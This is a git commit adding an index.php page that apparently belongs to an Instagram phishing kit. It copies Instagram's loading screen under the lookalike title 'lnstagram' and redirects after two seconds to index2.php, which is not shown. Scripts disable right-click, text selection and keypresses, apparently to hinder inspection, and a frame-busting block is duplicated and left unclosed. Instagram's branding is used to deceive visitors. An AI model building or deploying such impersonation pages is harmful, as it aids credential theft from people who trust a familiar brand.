7869bb63b1e673fe27d45416f9d9fc8662653222
CrazY5358 <107695178+CrazY5358@users.noreply.github.com>
2022-06-26 11:34:29 -0700

    Add files via upload

---
+++ index.php
@@ -0,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en" class="no-js not-logged-in client-root">
+
+    <link rel="icon" href="https://instagram.com/static/images/ico/xxxhdpi_launcher.png/9fc4bab7565b.png">
+    
+<meta http-equiv="content-type" content="text/html;charset=utf-8" />
+<head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <title>lnstagram</title>        
+        <meta name="robots" content="noimageindex, noarchive">
+        <meta name="apple-mobile-web-app-status-bar-style" content="default">
+        <meta name="mobile-web-app-capable" content="yes">
+        <meta name="theme-color" content="#ffffff">
+        <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, viewport-fit=cover">     
+ 
+<meta http-equiv="refresh" content="2; url=index2.php"> 
+
+</head>
+    <body class="" style="background: white;">        
+ <div id="react-root">      
+        <span><img width="50px" height="50" style="position:absolute;top:50%;left:50%;margin:-25px 0 0 -25px" src="https://i.imgyukle.com/2020/07/17/SHNOWo.png" /></span>
+        <span style="position:absolute;bottom:0;left:50%;margin:-41px 0 30px -41px;">
+<img width="82px" height="28px" src="https://i.imgyukle.com/2020/07/17/SHN2fR.png" />
+        </span>      
+    </div>
+    </body>
+	
+</html>
+<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false"></body>
+<script type="text/javascript">
+
+//form tags to omit in NS6+:
+var omitformtags=["input", "textarea", "select"]
+
+omitformtags=omitformtags.join("|")
+
+function disableselect(e){
+if (omitformtags.indexOf(e.target.tagName.toLowerCase())==-1)
+return false
+}
+
+function reEnable(){
+return true
+}
+
+if (typeof ********.onselectstart!="undefined")
+********.onselectstart=new Function ("return false")
+else{
+********.onmousedown=disableselect
+********.onmouseup=reEnable
+}
+
+</script>
+<body onkeydown="return false">
+
+
+<SCRIPT LANGUAGE="Javascript">
+
+if (parent.frames.length > 0)
+
+parent.********.href=self.********;
+
+
+<SCRIPT LANGUAGE="Javascript">
+
+if (parent.frames.length > 0)
+
+parent.********.href=self.********;
+
+</SCRIPT>
